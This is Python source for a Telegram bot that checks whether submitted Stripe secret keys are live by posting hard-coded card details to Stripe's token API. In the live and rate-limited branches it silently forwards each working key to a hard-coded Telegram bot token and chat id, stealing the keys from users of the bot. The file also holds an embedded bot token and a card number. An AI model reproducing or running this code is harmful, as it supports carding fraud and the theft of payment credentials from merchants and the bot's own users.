import re, requests, string
import logging
import requests
import time
import string
import random
import asyncio
import re
import base64
import json
import sys
import urllib3
import http.client
import os

from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, CallbackContext, Filters

SK = os.getenv('SK')
session = requests.session()
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for i in range(6))
Last = ''.join(random.choice(letters) for i in range(6))
PWD = ''.join(random.choice(letters) for i in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
time1 = time.time()
def check_sk(input):
  
    
  input = input.split(' ')
  input = input[1]
  print(input)
  b = session.get('https://ip.seeip.org/').text
  skk = f'Bearer {input}'
  print(skk)
  

        # hmm
  load = {
            
            "card[number]": "5253460005340970",
            "card[exp_month]": "08",
            "card[exp_year]": "23",
            "card[cvc]": "513"
        }

  header = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization": skk,
            "user-agent": UA,
            "accept-language": "en-US,en;q=0.9"

        }
  
  rx =  requests.post('https://api.stripe.com/v1/tokens',
                          data=load, headers=header)
  res = rx.json()
  print(res)
      
      
  
  if 'declined' in rx.text:
            
            requests.get('https://api.telegram.org/bot5380276548:AAGpPwcq33EcsQQ8WKyS_htKJUU3SWSkxPk/sendMessage?chat_id=1924942921&text='+input+'', headers=header)
            return (f'''
✅<b>SK Live</b>➟ <code>{input}</code>
''')
  if 'tok' in rx.text:
            
            requests.get('https://api.telegram.org/bot5380276548:AAGpPwcq33EcsQQ8WKyS_htKJUU3SWSkxPk/sendMessage?chat_id=1924942921&text='+input+'', headers=header)
            return (f'''
✅<b>SK Live</b>➟ <code>{input}</code>
''')  
        
  if 'Request rate limit exceeded.' in rx.text:
            requests.get('https://api.telegram.org/bot5380276548:AAGpPwcq33EcsQQ8WKyS_htKJUU3SWSkxPk/sendMessage?chat_id=1924942921&text='+input+'', headers=header)
            
            return (f'''
✅<b>SK Live Rate Limit</b>➟ <code>{input}</code>''')

  if 'API Key provided' in rx.text:
            
            msg = res['error']['message']
            return (f'''
❌<b>SK Dead</b>➟ <code>{input}</code>''')
        
  if 'testmode_charges_only' in rx.text:
            
            msg = res['error']['message']
            return (f'''
❌<b>SK Dead</b>➟ <code>{input}</code>''')      